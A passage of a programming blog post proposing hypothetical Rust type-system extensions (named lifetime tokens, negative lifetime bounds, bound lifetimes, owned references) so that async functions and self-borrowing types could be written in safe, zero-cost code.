    &lt;p&gt;Lastly, this post will discuss changes purely from a type checking perspective without regard to how hard they’d actually be to implement. In a major real-world language like Rust, any change, no matter how trivial, has a huge cost in terms of ecosystem, documentation, tooling, backwards compatibility, etc. But I’m a language design hobbyist, not a Rust compiler engineer, so language design is the part I’ll speak about.&lt;/p&gt;
    &lt;p&gt;So how do you type-check self borrows? The trick is actually to adopt an even more ambitious goal, safe async functions.&lt;/p&gt;
    &lt;head rend="h2"&gt;A brief history of Rust&lt;/head&gt;
    &lt;p&gt;Rust 1.0 shipped with no support whatsoever for non-movable types. The fact that any value of any type could be arbitrarily memcpy’d around and still work was a core assumption of the language.&lt;/p&gt;
    &lt;p&gt;However, it didn’t take long before people realized that non-movable types are actually very useful. In particular, async functions nearly always produce non-movable future types, so you can’t have async Rust without support in some fashion for non-movable types.&lt;/p&gt;
    &lt;p&gt;Sadly, it was too late to do things properly (i.e. a &lt;code&gt;Move&lt;/code&gt; auto-trait), but they were able to at least hack in partial support via the &lt;code&gt;Pin&lt;/code&gt; type, added in Rust 1.33.0.&lt;/p&gt;
    &lt;head rend="h3"&gt;…but not for thee&lt;/head&gt;
    &lt;p&gt;Now if you’re like me, you might have thought, “Pin is added, which means support for self-borrows. Great, now I can refactor and simplify all my code!” Unfortunately, that’s not what actually happened.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;Pin&lt;/code&gt; made it possible for Rust code to work with and pass around non-movable types, but there was still no way to actually create them. That is a bit of dark magic that the compiler jealously hoards for itself. Whenever you write an async function, the compiler will magically generate a secret non-movable type, and &lt;code&gt;Pin&lt;/code&gt; makes it possible to work with these types, but there is still no way to actually create self-referential types yourself (again, in safe, zero-cost code).&lt;/p&gt;
    &lt;p&gt;However, what if it didn’t have to be this way? Personally, I think async functions (and closures) should be desugared into 100% safe Rust code that the user could have written themselves if they wanted to. Not because users would necessary actually want to do that very often, but because having a desugared version of every magic feature is useful didactically and for low-level libraries, and because it forces Rust to be honest about its type system instead of papering over the cracks with compiler magic.&lt;/p&gt;
    &lt;p&gt;Since async functions have self-borrows, supporting them conveniently also implies support for self-borrows more generally. Now the only question is how to actually support safe async functions.&lt;/p&gt;
    &lt;p&gt;The rest of this post is divided into two parts. In part 1, I will cover the changes needed from a high level type system perspective, while in part 2, I’ll cover the remaining low level details.&lt;/p&gt;
    &lt;head rend="h1"&gt;Part 1: The value level&lt;/head&gt;
    &lt;p&gt;In order to make async functions possible in (safe) Rust, we first have to figure out why they aren’t possible already. Most people would answer “async functions have self-borrows, and it is impossible to support self-borrows in the borrow checker”, but that is the wrong way to look at things. The actual answer is that it is impossible to name the types of local variables.&lt;/p&gt;
    &lt;p&gt;To see why this is, consider how you would go about desugaring an async function. Suppose we have a simple async function &lt;code&gt;foo&lt;/code&gt; that adds some numbers and calls another async function like this:&lt;/p&gt;
    &lt;code&gt;fn sub() -&amp;gt; Pin&amp;lt;Box&amp;lt;dyn Future&amp;lt;Output=()&amp;gt;&amp;gt;&amp;gt; {todo!()}

async fn foo() -&amp;gt; u32 {
    let x = 12345;
    let f = sub();
    f.await;
    
    let y = x * 2;
    let f2 = sub();
    f2.await;
    
    x + y
}
&lt;/code&gt;
    &lt;p&gt;How would we desugar &lt;code&gt;foo&lt;/code&gt; by hand? We need to create a custom Future type &lt;code&gt;Foo&lt;/code&gt; with a state machine representing the possible states of the original &lt;code&gt;foo&lt;/code&gt; function. Specifically, we need a state machine with one state per &lt;code&gt;await&lt;/code&gt; point in the function, plus a begin and end state. And the contents of each state are just the local variables that are live at that point in the function.&lt;/p&gt;
    &lt;p&gt;Therefore, our custom state machine type would look like this:&lt;/p&gt;
    &lt;code&gt;enum Foo {
    Initial,
    Await1{x: u32, f: Pin&amp;lt;Box&amp;lt;dyn Future&amp;lt;Output=()&amp;gt;&amp;gt;&amp;gt;},
    Await2{x: u32, y: u32, f2: Pin&amp;lt;Box&amp;lt;dyn Future&amp;lt;Output=()&amp;gt;&amp;gt;&amp;gt;},
    Final,
}
&lt;/code&gt;
    &lt;p&gt;In order to create this type, we “just” have to list every local variable that is live at an await point, along with the types of all those local variables. Therefore, supporting async functions in safe Rust is just a matter of making it consistently possible to name the types of every variable. So why is this impossible to do right now? The first obstacle is unnameable types.&lt;/p&gt;
    &lt;head rend="h2"&gt;Unnameable types&lt;/head&gt;
    &lt;p&gt;Rust made the interesting design decision to require explicit type annotations on every function boundary and every custom type, and yet also make it impossible to write explicit types in many cases. This was already a problem in Rust 1.0 with closures, but got much worse a few years later with the introduction of async Rust and impl Trait.&lt;/p&gt;
    &lt;p&gt;Basically, some types (closures, async functions, impl Trait) exist in Rust’s type system but do not have a name and hence are impossible to talk about in your code. You can still pass those values around and interact with them as long as you never have to explicitly name their type, but as soon as you hit a function boundary or want to store them inside a struct or enum, whoops, it’s time to add generics or pointlessly &lt;code&gt;Box&lt;/code&gt; everything up.&lt;/p&gt;
    &lt;p&gt;Even in the example code above, this is already a problem. I had to go out of my way to make &lt;code&gt;sub&lt;/code&gt; return a boxed &lt;code&gt;dyn Future&lt;/code&gt; in order to have a nameable type for the sake of example, but any realistic code would instead be working with unnameable futures everywhere.&lt;/p&gt;
    &lt;p&gt;Fortunately, this is also a very easy problem to solve - just give every type a name. Efforts to do this already have been indefinitely stalled over concerns about stabilizing the order of generic type parameters, but that’s a trivial concern compared to the much more invasive changes we’ll get into later.&lt;/p&gt;
    &lt;head rend="h3"&gt;Named lifetimes&lt;/head&gt;
    &lt;p&gt;There’s actually another kind of unnameable type as well - function local lifetimes. Unlike closures and futures, these can never cross a function boundary without being replaced by generic parameters, so they don’t cause problems for existing code, but they’re still types that can’t be named, and if we’re going to support async functions in Rust, we need a way to name them.&lt;/p&gt;
    &lt;p&gt;Any syntax actually added to Rust would obviously have to get bikeshedded to death and assessed for education and tooling and so on, but as I’m just a person writing a blog post, I’m under no such constraints, so for the sake of example, I’ll propose the following syntax:&lt;/p&gt;
    &lt;code&gt;let mut v = Vec::new();
life 'a, 'b;

let r = &amp;amp;'a mut v;
// do stuff with r
end 'a;

let r2 = &amp;amp;'b mut v;
// do stuff with r2
end 'b;
&lt;/code&gt;
    &lt;p&gt;In this proposal, you first declare a lifetime token via &lt;code&gt;life 'a&lt;/code&gt;. This token represents a lifetime that lasts as long as the token exists. Next, when borrowing a reference, you can optionally specify an explicit lifetime, e.g. &lt;code&gt;&amp;amp;'a mut v&lt;/code&gt;. Finally, you can end a lifetime via &lt;code&gt;end 'a&lt;/code&gt;, which consumes the token.&lt;/p&gt;
    &lt;p&gt;This syntax is more verbose than the current syntax, but I don’t expect users to actually use named lifetime syntax that often. I see it like &lt;code&gt;drop&lt;/code&gt;. You can write all your &lt;code&gt;drop&lt;/code&gt;s explicitly if you want to, but most of the time people let the compiler insert them implicitly instead. Likewise under my proposal, people will usually still use the current syntax and let the compiler implicitly insert anonymous lifetimes, but they can also write named lifetimes explicitly if they want to.&lt;/p&gt;
    &lt;head rend="h3"&gt;Static checking&lt;/head&gt;
    &lt;p&gt;Under my named lifetimes proposal, all checking is still done purely at compile time, just like the existing borrow checker. The lifetime tokens only exist at compile time and there is no runtime impact.&lt;/p&gt;
    &lt;p&gt;In order to do all type checking statically, we have to enforce certain invariants. Specifically, types can only refer to lifetimes in the current scope. Any type that escapes outside of the scope of the lifetime token it refers to becomes invalid. Likewise, consuming a lifetime token invalidates all types that refer to that lifetime.&lt;/p&gt;
    &lt;head rend="h2"&gt;Inconceivable types&lt;/head&gt;
    &lt;p&gt;As it turns out, unnameable types aren’t the only barrier to naming the types of variables in Rust. Unnameable types are types that still exist in Rust’s formal type system, but don’t have names. However, Rust’s formal type system is only a subset of its de-facto type system because in addition to Rust’s official type checker, the compiler also incorporates shadow type checkers which do type-checking like things but are not formally part of the type checker.&lt;/p&gt;
    &lt;p&gt;There are types that are part of Rust’s de-facto type system which don’t even exist in Rust’s formal type system in the first place, let alone have names. I call these types inconceivable types because from the perspective of a Rust compiler engineer, they aren’t types and don’t even exist in the first place.&lt;/p&gt;
    &lt;p&gt;Therefore, in order to support async functions, we’ll also need to add all the missing inconceivable types into Rust’s formal type system.&lt;/p&gt;
    &lt;head rend="h3"&gt;Partial moves&lt;/head&gt;
    &lt;p&gt;What are these shadow type checkers? Consider the following Rust code:&lt;/p&gt;
    &lt;code&gt;use std::mem::drop;

#[derive(Default)]
struct MyStrings {
    x: String,
    y: String,
}

async fn foo() {
    let ms = MyStrings::default();
    
    drop(ms.x);
    drop(ms.y);
}
&lt;/code&gt;
    &lt;p&gt;At first glance, this code shouldn’t compile. After all, &lt;code&gt;ms&lt;/code&gt; is used twice, right? &lt;code&gt;ms&lt;/code&gt; should already be moved when it is referenced the first time in &lt;code&gt;ms.x&lt;/code&gt;, which would make &lt;code&gt;ms.y&lt;/code&gt; a compile error. However, the Rust compiler actually allows this!&lt;/p&gt;
    &lt;p&gt;The reason is because Rust has a secret shadow type checker which allows you to partially move and partially borrow values as long as they stay within a function. The fact that this is limited to within a function makes it harder to spot since it never forces the user to write the function-boundary-mandatory type annotations that would be impossible since these types don’t actually exist in Rust’s formal type system.&lt;/p&gt;
    &lt;p&gt;However, they are still a problem for async functions because we need to be able to specify the types of local variables as well. Consider the following code:&lt;/p&gt;
    &lt;code&gt;async fn foo() {
    let ms = MyStrings::default();
    
    drop(ms.x);
    // What is ms's type here?!?!
    sub().await;
    drop(ms.y);
}
&lt;/code&gt;
    &lt;p&gt;What is the type of &lt;code&gt;ms&lt;/code&gt; at the await point? The formal type system would answer “oh, the type is &lt;code&gt;MyStrings&lt;/code&gt;, that doesn’t change.” However, its de-facto type clearly does change. After all, you can’t access the &lt;code&gt;x&lt;/code&gt; field on it like you could for any true value of type &lt;code&gt;MyStrings&lt;/code&gt;. The true type is now something else entirely, an inconceivable type.&lt;/p&gt;
    &lt;p&gt;Therefore, the next step is to add the inconceivable types for partial borrows and partial moves to Rust’s formal type system, so that they can be referenced in type annotations. For this, I propose the syntax &lt;code&gt;Foo{bar, baz}&lt;/code&gt;, to list the fields explicitly. E.g. &lt;code&gt;MyStrings{y}&lt;/code&gt; means a value with the memory layout of &lt;code&gt;MyStrings&lt;/code&gt;, but where only field &lt;code&gt;y&lt;/code&gt; remains (with the &lt;code&gt;x&lt;/code&gt; part being arbitrary uninitialized data). This can be extended to partial borrows as well, e.g. &lt;code&gt;&amp;amp;mut Foo{bar, baz}&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;However, that’s not all. There’s still one more shadow type checker to deal with, and it’s a really big one. As it turns out, the borrow checker is also a shadow type checker.&lt;/p&gt;
    &lt;head rend="h3"&gt;Borrowed types&lt;/head&gt;
    &lt;p&gt;Consider the following code:&lt;/p&gt;
    &lt;code&gt;async fn foo() {
    let mut s = "Hello, world".to_string();
    let r = &amp;amp;mut s;
    // What is the type of s here???
    sub().await;
    
    r.push('!');
    println!("{}", s);
}
&lt;/code&gt;
    &lt;p&gt;What is the type of &lt;code&gt;s&lt;/code&gt; at the await point? Again, the formal type system says “it’s &lt;code&gt;String&lt;/code&gt; the whole time, that doesn’t change”, but again that’s a lie. The de-facto type of &lt;code&gt;s&lt;/code&gt; can’t be &lt;code&gt;String&lt;/code&gt;, because it doesn’t support the operations of a value of type &lt;code&gt;String&lt;/code&gt;. In fact, it doesn’t support any operations, because any attempt to access &lt;code&gt;s&lt;/code&gt; at that point will result in a compile error.&lt;/p&gt;
    &lt;p&gt;Therefore, the type of &lt;code&gt;s&lt;/code&gt; must be temporarily changing to some other, inconceivable type. Specifically, the types of borrowed values are inconceivable types.&lt;/p&gt;
    &lt;p&gt;For this, I propose the syntax &lt;code&gt;!'a mut String&lt;/code&gt;, but to understand why, we’ll first have to go into a brief digression on the theoretical basis for borrow checking.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why borrow checking?&lt;/head&gt;
    &lt;p&gt;There’s a common misconception, even in the Rust community, that borrow checking is just a memory management strategy, just a quirk of languages in the C++ niche and not something you need in a language with garbage collection. In fact however, borrow checking is the inevitable consequence of protecting against aliasing bugs, regardless of which memory management strategy a language uses.&lt;/p&gt;
    &lt;head rend="h3"&gt;Affine types&lt;/head&gt;
    &lt;p&gt;In a traditional language, if you have a value of type &lt;code&gt;T&lt;/code&gt;, you can make any number of copies of that value that all still have type T, just by reading it:&lt;/p&gt;
    &lt;code&gt;let foo: T = ...;
let bar: T = foo;
// foo and bar have type T
&lt;/code&gt;
    &lt;p&gt;However, this doesn’t work if you want to reason about aliasing. In particular, if you have a type for exclusively referenced objects (written &lt;code&gt;xcl&lt;/code&gt; in this section for the sake of example), it is not sound to allow copying like this, because then you’ll have two references to the same object, both of which think they are the only one.&lt;/p&gt;
    &lt;p&gt;Therefore, exclusive references must be affine types, meaning that they can only be used once.&lt;/p&gt;
    &lt;head rend="h3"&gt;Splitting&lt;/head&gt;
    &lt;p&gt;However, being able to use each value only once makes it impossible to write all but the most trivial programs. In order to do anything useful, you need to be able to split a type so you can use values more than once.&lt;/p&gt;
    &lt;p&gt;A type can be thought of as a set of permissions to access the associated value, and thus it is safe to copy a value as long as the permissions aren’t copied. Instead, the child values need to have a disjoint set of permissions.&lt;/p&gt;
    &lt;p&gt;For example, suppose we have an exclusive reference to an object with fields of type &lt;code&gt;T&lt;/code&gt; and &lt;code&gt;U&lt;/code&gt;.&lt;/p&gt;
    &lt;code&gt;let a = {foo: _, bar: _};
// a has the type xcl {foo: T, bar: U};

let b = a as {foo: T};
// b has type xcl {foo: T}
// a has type xcl {bar: U}
&lt;/code&gt;
    &lt;p&gt;We can create a second reference to the object by splitting the permissions - after the split &lt;code&gt;a&lt;/code&gt; only has the ability to read the field &lt;code&gt;bar&lt;/code&gt; while &lt;code&gt;b&lt;/code&gt; only has the ability to read field foo. Since they can only read disjoint parts of the object, it is still sound to have two exclusive references to the same object. (Note: this is pseudocode in a high level language for the sake of example - Rust doesn’t actually work this way due to other, low level considerations).&lt;/p&gt;
    &lt;p&gt;For traditional types (or &lt;code&gt;Copy&lt;/code&gt; types in Rust parlance), you have the splitting rule &lt;code&gt;T =&amp;gt; T + T&lt;/code&gt;. In other words, given a value of &lt;code&gt;T&lt;/code&gt;, you can split it into two values that both still have type &lt;code&gt;T&lt;/code&gt;. For affine types, that splitting rule doesn’t exist, but there are still other splitting rules that are sound. For example, you can split by fields as we just saw: &lt;code&gt;xcl {foo: T, bar: U} =&amp;gt; (xcl {foo: T}) + (xcl {bar: U})&lt;/code&gt;.&lt;/p&gt;
    &lt;head rend="h3"&gt;Temporal splitting&lt;/head&gt;
    &lt;p&gt;The previous splitting rule is spacial - you can split access over disjoint fields of an object. However, spatial splitting alone doesn’t get you very far. In order to write practical code, you need another splitting rule. Besides splitting access by space, you can also split access by time.&lt;/p&gt;
    &lt;p&gt;Specifically, you can create a second copy of the reference as long as one copy can only be accessed before a given time, and the other copy can only be accessed after a given time. Since the access is split into disjoint periods of time, this is still sound.&lt;/p&gt;
    &lt;code&gt;life 'a;
let v = vec![42];
// v has exclusive access to the object

let r = &amp;amp;'a mut v;
// r has exclusive access to the object before time a
// v has exclusive access to the object *after* time a
&lt;/code&gt;
    &lt;p&gt;This is the essence of borrow checking. It’s not some arcane, low level memory management strategy, but just a natural, essential method of statically reasoning about aliasing in your code.&lt;/p&gt;
    &lt;head rend="h3"&gt;Negative lifetime bounds&lt;/head&gt;
    &lt;p&gt;Borrow checking involves two kinds of types - references that are valid before a given time, and references that are valid after a given time. The first kind is already part of Rust’s formal type system, the ordinary references you know and love. A value of type &lt;code&gt;&amp;amp;'a mut T&lt;/code&gt; has exclusive access before time &lt;code&gt;a&lt;/code&gt;, and no access after time &lt;code&gt;a&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;However, Rust’s formal type system has no notion of the second kind of type, of references that are valid after a given time. This is the inconceivable type we need to add.&lt;/p&gt;
    &lt;p&gt;Since these are the opposite of normal lifetimes, it makes sense to use the “not” symbol &lt;code&gt;!&lt;/code&gt;, e.g. &lt;code&gt;!'a&lt;/code&gt;, which I call a negative lifetime bound. A bound of &lt;code&gt;'a&lt;/code&gt; means the type is only valid until &lt;code&gt;a&lt;/code&gt;, while a bound of &lt;code&gt;!'a&lt;/code&gt; means it is only valid after &lt;code&gt;a&lt;/code&gt; instead.&lt;/p&gt;
    &lt;head rend="h2"&gt;Bound lifetimes&lt;/head&gt;
    &lt;p&gt;We can now express the types of all local variables, even the types that don’t currently exist in Rust, but there’s still one more problem. Recall that the example of named lifetimes looked like this:&lt;/p&gt;
    &lt;code&gt;let mut v = Vec::new();
life 'a, 'b;

let r = &amp;amp;'a mut v;
// do stuff with r
end 'a;

let r2 = &amp;amp;'b mut v;
// do stuff with r2
end 'b;
&lt;/code&gt;
    &lt;p&gt;The problem is that the lifetime tokens (&lt;code&gt;'a&lt;/code&gt; and &lt;code&gt;'b&lt;/code&gt;) are themselves part of the function’s local state, and thus also have to be stored inside the state machine enum. Therefore, we need a way to store lifetime tokens inside of objects.&lt;/p&gt;
    &lt;p&gt;My proposed syntax introduces a new expression, &lt;code&gt;bind 'a in x&lt;/code&gt;, which moves the lifetime token ‘a into the value x. And likewise, we have new destructuring pattern syntax, &lt;code&gt;let bind 'a in x = y;&lt;/code&gt;, to do the reverse. Lastly, this also adds a new type, &lt;code&gt;bind 'a in T&lt;/code&gt;, representing a type &lt;code&gt;T&lt;/code&gt; with bound lifetime token &lt;code&gt;'a&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Note that lifetime tokens and lifetimes only exist at compile time and have no runtime representation. &lt;code&gt;bind 'a in v&lt;/code&gt; and the like are noops that exist purely for the sake of static type checking, and &lt;code&gt;bind 'a in T&lt;/code&gt; has the same runtime representation as &lt;code&gt;T&lt;/code&gt;.&lt;/p&gt;
    &lt;head rend="h3"&gt;Moving lifetime tokens&lt;/head&gt;
    &lt;p&gt;With the &lt;code&gt;end 'a&lt;/code&gt; syntax, the lifetime token &lt;code&gt;'a&lt;/code&gt; is consumed in place, which means that we know precisely when it ends. All types in scope with a positive (&lt;code&gt;'a&lt;/code&gt;) bound become invalid, while all types in scope with a negative bound (&lt;code&gt;!'a&lt;/code&gt;) have the negative bound removed (returning it to the original, unborrowed type).&lt;/p&gt;
    &lt;p&gt;However, when we move a lifetime token into a value, types referring to that lifetime which were in the old scope but not the new scope have to be treated differently. In this case, the lifetime token is no longer in scope without being ended, and so we have to pessimistically invalidate both positive and negative bounds. Types that reference the lifetime which are still within the new scope (i.e. the value that the lifetime token was bound to) are unaffected.&lt;/p&gt;
    &lt;head rend="h2"&gt;Examples&lt;/head&gt;
    &lt;p&gt;This can be pretty confusing, so let’s look at some examples to show how the new lifetime system works.&lt;/p&gt;
    &lt;p&gt;First, suppose you try to return a reference to a local variable:&lt;/p&gt;
    &lt;code&gt;life 'a;
let mut s = Box::new("Hello".to_string());
// s has type Box&amp;lt;String&amp;gt;
let r = &amp;amp;'a mut *s;
// r has type &amp;amp;'a mut String
// s has type Box&amp;lt;!'a mut String&amp;gt;
return r; // error: r is invalid
&lt;/code&gt;
    &lt;p&gt;This naturally results in a compile error because &lt;code&gt;r&lt;/code&gt; has the type &lt;code&gt;&amp;amp;'a mut String&lt;/code&gt;, but the lifetime token &lt;code&gt;'a&lt;/code&gt; is local to the function. Therefore, when r is returned, it is no longer within the scope where &lt;code&gt;'a&lt;/code&gt; exists and hence is invalid.&lt;/p&gt;
    &lt;p&gt;Now suppose we try binding &lt;code&gt;'a&lt;/code&gt; to &lt;code&gt;r&lt;/code&gt; before returning it:&lt;/p&gt;
    &lt;code&gt;life 'a;
let mut s = Box::new("Hello".to_string());
// s has type Box&amp;lt;String&amp;gt;
let r = &amp;amp;'a mut *s;
// r has type &amp;amp;'a mut String
// s has type Box&amp;lt;!'a mut String&amp;gt;
let ret = bind 'a in r;
// ret has type (bind 'a in &amp;amp;'a mut String)
// s has type invalid
return ret; // error: s is invalid
&lt;/code&gt;
    &lt;p&gt;This time, &lt;code&gt;ret&lt;/code&gt; contains its own lifetime token, and so is not invalidated when returning. However, moving the lifetime token &lt;code&gt;'a&lt;/code&gt; into &lt;code&gt;ret&lt;/code&gt; invalidates &lt;code&gt;s&lt;/code&gt;. Returning causes &lt;code&gt;s&lt;/code&gt; to be implicitly dropped, but it can’t be dropped because it is invalid, resulting in a compile error.&lt;/p&gt;
    &lt;p&gt;Finally, let’s try binding &lt;code&gt;'a&lt;/code&gt; to a tuple of both &lt;code&gt;r&lt;/code&gt; and &lt;code&gt;s&lt;/code&gt; and returning that:&lt;/p&gt;
    &lt;code&gt;life 'a;
let mut s = Box::new("Hello".to_string());
// s has type Box&amp;lt;String&amp;gt;
let r = &amp;amp;'a mut *s;
// r has type &amp;amp;'a mut String
// s has type Box&amp;lt;!'a mut String&amp;gt;
let ret = bind 'a in (s, r);
// ret has type (bind 'a in (Box&amp;lt;!'a mut String&amp;gt;, &amp;amp;'a mut String))
return ret; // ok
&lt;/code&gt;
    &lt;p&gt;This time, everything works. We’ve just returned a string along with a borrowed reference to that string in a 100% safe and zero-cost manner!&lt;/p&gt;
    &lt;head rend="h3"&gt;Destructuring&lt;/head&gt;
    &lt;p&gt;Now that we’ve successfully returned a self-borrowed object, let’s look at how you would use an object with self-borrows.&lt;/p&gt;
    &lt;code&gt;fn foo(v: bind 'a in (Box&amp;lt;!'a mut String&amp;gt;, &amp;amp;'a mut String)) {
    // v has type (bind 'a in (Box&amp;lt;!'a mut String&amp;gt;, &amp;amp;'a mut String))

    let bind 'b in (s, r) = v;
    // 'b is a lifetime token
    // s has type Box&amp;lt;!'b mut String&amp;gt;
    // r has type &amp;amp;'b mut String

    r.push_str(" world!");
    end 'b;
    // s has type Box&amp;lt;String&amp;gt;
    // r is invalid

    println!("{}", s);
}

&lt;/code&gt;
    &lt;head rend="h2"&gt;External lifetimes&lt;/head&gt;
    &lt;p&gt;So far, we’ve only looked at owned lifetime tokens. However, in some cases, you instead have a reference to an unknown lifetime token that exists elsewhere. There are two cases where this can happen:&lt;/p&gt;
    &lt;p&gt;Generic lifetime parameters&lt;/p&gt;
    &lt;p&gt;When a generic function is called, the generic lifetime parameters represent some lifetime which is owned by some caller of the function. These lifetimes are guaranteed to last at least as long as the function call, but could last longer.&lt;/p&gt;
    &lt;p&gt;Destructured references to bound lifetimes&lt;/p&gt;
    &lt;p&gt;In the previous example, we destructured an owned value that contained a lifetime token, resulting in the token being moved into the current scope.&lt;/p&gt;
    &lt;p&gt;If you destructure a reference to a value with a lifetime token, you instead get a reference to a lifetime token, rather than the token itself. These lifetimes are guaranteed to last at least as long as the destructured reference, but could last longer.&lt;/p&gt;
    &lt;p&gt;When you have a reference to an external lifetime, you can’t end or move the lifetime, since you don’t own the corresponding token. However, as long as the lifetime reference exists, you still can interact with types that refer to that lifetime.&lt;/p&gt;
    &lt;p&gt;Here’s an example of mutating a value with a bound lifetime via a mutable reference:&lt;/p&gt;
    &lt;code&gt;fn foo&amp;lt;'call&amp;gt;(v: &amp;amp;'call mut (bind 'a in (!'a String, &amp;amp;'a str))) {
    // 'call is an external lifetime
    // v has type &amp;amp;'call mut (bind 'a in (!'a String, &amp;amp;'a str))

    let bind 'b in (s, r) = v;
    // 'b is an external lifetime
    // s has type &amp;amp;'call mut (!'b String)
    // r has type &amp;amp;'call mut (&amp;amp;'b str)

    let (r1, r2) = r.split_at(32);
    // r1 and r2 have type (&amp;amp;'b str)

    // can assign back to r since they both have type &amp;amp;'b str
    *r = r2;
}
&lt;/code&gt;
    &lt;p&gt;Lastly, we also need to add a type to represent bound lifetime references in a type. However, the recursion stops there because a reference to a reference to a lifetime is equivalent to just a reference to a lifetime, since they don’t actually have any state or runtime representation and can’t be mutated.&lt;/p&gt;
    &lt;head rend="h1"&gt;Part 2: The bytes level&lt;/head&gt;
    &lt;p&gt;If we were writing a high-level language, we’d already be done, but for Rust, we still have the low-level details to worry about.&lt;/p&gt;
    &lt;p&gt;There are two ways to consider a type system. The first is what your code does, in an abstract machine, with no concerns about how it is actually implemented. I call this “the value level”.&lt;/p&gt;
    &lt;p&gt;The second level is how your code does it, in terms of low level implementation details like how values are stored in memory, which I call “the bytes level”. In a high level language, this might not even be exposed to users, but as Rust is a systems language, it gives programmers control over low level details like this.&lt;/p&gt;
    &lt;p&gt;To keep things simple, Rust has a single type system which implicitly encodes both levels in a single type. Unfortunately, this means that the desired combination is sometimes simply not represented in Rust’s type system.&lt;/p&gt;
    &lt;p&gt;In particular, Rust conflates ownership of values with ownership of the memory where those values are stored. This isn’t just a problem for a new feature like async functions. It causes problems even in ordinary real-world Rust coding. In particular, it means that &lt;code&gt;Drop&lt;/code&gt; has the wrong type signature because the correct type signature simply doesn’t exist in Rust.&lt;/p&gt;
    &lt;head rend="h2"&gt;Drop&lt;/head&gt;
    &lt;p&gt;When I say “&lt;code&gt;Drop&lt;/code&gt; has the wrong type signature”, some people might be thinking, “oh, you mean it should have wrapped &lt;code&gt;self&lt;/code&gt; in &lt;code&gt;Pin&lt;/code&gt;, right?”. But that’s just a minor inconvenience to people who are writing unsafe code anyway, and &lt;code&gt;Pin&lt;/code&gt; itself only dates back to Rust 1.33.0. The problem I’m talking about is much worse. &lt;code&gt;Drop&lt;/code&gt; was broken, even in Rust 1.0.&lt;/p&gt;
    &lt;p&gt;For example, last year, I had a struct containing a Tokio oneshot channel, and I wanted to send on that channel when the container was dropped. No problem, I figured, this is exactly the kind of thing Rust is good at. Should be easy, right?&lt;/p&gt;
    &lt;p&gt;…right??&lt;/p&gt;
    &lt;code&gt;struct Foo {
    channel: tokio::sync::oneshot::Sender&amp;lt;()&amp;gt;,
}
impl Drop for Foo {
    fn drop(&amp;amp;mut self) {
        // error[E0507]: cannot move out of `self.channel` which is behind a mutable reference
        self.channel.send(());
    }
}
&lt;/code&gt;
    &lt;p&gt;As it turns out, this seemingly simple task is impossible to do in Rust. (And yes, as always, you can throw away static checking and just use &lt;code&gt;unsafe&lt;/code&gt; or wrap your type in an unnecessary &lt;code&gt;Option&lt;/code&gt; or whatever. I’m talking about safe zero-cost Rust here.)&lt;/p&gt;
    &lt;p&gt;The reason why this seemingly simple code pattern is impossible is right there in the error message. &lt;code&gt;Drop&lt;/code&gt; takes &lt;code&gt;self&lt;/code&gt; by mutable reference. In Rust, mutable references have the invariant that the type is unchanged. You can’t move fields out of a mutable reference (unless you replace them with another value of the same type).&lt;/p&gt;
    &lt;p&gt;The whole point of a destructor is to destruct your type. The value is disassembled and the type goes away. You start with &lt;code&gt;T&lt;/code&gt; and end with nothing. However, &lt;code&gt;Drop&lt;/code&gt; takes &lt;code&gt;&amp;amp;mut T&lt;/code&gt; instead, which has the postcondition that everything is unchanged and your &lt;code&gt;T&lt;/code&gt; is still sitting there, good as always. Somehow, Rust ended up with a destructor api that can’t actually destruct anything.&lt;/p&gt;
    &lt;p&gt;So how did Rust make such an obvious mistake? The problem is that the Rust designers painted themselves into a corner in a misguided attempt to minimize the number of types in the formal type system.&lt;/p&gt;
    &lt;head rend="h3"&gt;Owned references&lt;/head&gt;
    &lt;p&gt;Currently, Rust has three kinds of types: &lt;code&gt;T&lt;/code&gt;, &lt;code&gt;&amp;amp;mut T&lt;/code&gt;, and &lt;code&gt;&amp;amp;T&lt;/code&gt;. If you plot their ownership and representation, you get this:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Type&lt;/cell&gt;
        &lt;cell role="head"&gt;Owned?&lt;/cell&gt;
        &lt;cell role="head"&gt;Representation&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;T&lt;/cell&gt;
        &lt;cell&gt;yes&lt;/cell&gt;
        &lt;cell&gt;inline&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;&amp;amp;mut T&lt;/cell&gt;
        &lt;cell&gt;no&lt;/cell&gt;
        &lt;cell&gt;pointer&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;&amp;amp;T&lt;/cell&gt;
        &lt;cell&gt;no&lt;/cell&gt;
        &lt;cell&gt;pointer&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Notice something missing? There is no possible type with “yes, pointer” (or “no, inline” for that matter, but that doesn’t matter much). Rust conflates ownership with representation. (More specifically, there is no way to own a value without owning the underlying memory - &lt;code&gt;Box&amp;lt;T&amp;gt;&lt;/code&gt; is technically an owned pointer, but the pointer can only point to its own, owned memory, not memory that is managed elsewhere.)&lt;/p&gt;
    &lt;p&gt;In Rust, there is no way to transfer ownership of a value without moving the value. This was a major problem when Rust added async and decided that it needed to deal with non-movable types after all. Since the assumption of movability is built into the language in such a core way, there was no way to add non-movable types other than just saying “ok, everything related to them is unsafe, but here’s &lt;code&gt;Pin&lt;/code&gt; so you can at least partially hide the unsafety from your users, have fun”.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;Drop&lt;/code&gt; can’t take &lt;code&gt;self&lt;/code&gt; as a mutable reference because mutable references can’t be destructed, as discussed above. But it also can’t take &lt;code&gt;self&lt;/code&gt; by value, because that makes it impossible to drop non-movable types. (There are also minor considerations around recursion, presumably the reason &lt;code&gt;Drop&lt;/code&gt; didn’t take values even before Rust added non-movable types.)&lt;/p&gt;
    &lt;p&gt;The solution to this dilemma is that the correct type for &lt;code&gt;Drop&lt;/code&gt; to take is a type that currently doesn’t exist - an owned reference, which I’ll write &lt;code&gt;&amp;amp;own T&lt;/code&gt;.&lt;/p&gt;
